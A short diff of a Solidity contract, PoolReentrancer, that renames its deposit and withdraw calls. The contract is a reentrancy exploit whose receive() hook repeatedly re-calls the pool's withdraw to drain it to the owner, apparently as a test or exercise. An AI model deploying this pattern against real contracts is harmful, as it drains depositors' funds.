@@ -17,19 +17,19 @@ contract PoolReentrancer {
     pool = Pool(_pool);
   }
 
-  function depositFunds() external payable {
-    pool.depositFunds{value: msg.value}();
+  function invest() external payable {
+    pool.invest{value: msg.value}();
   }
 
-  function withdrawFunds() external {
-    pool.withdrawFunds();
+  function withdraw() external {
+    pool.withdraw();
     payable(owner).transfer(address(this).balance);
   }
 
   receive() external payable {
     if (msg.sender == address(pool)) {
       if (msg.sender.balance >= 1 ether) {
-        Pool(msg.sender).withdrawFunds();
+        Pool(msg.sender).withdraw();
       }
     }
   }
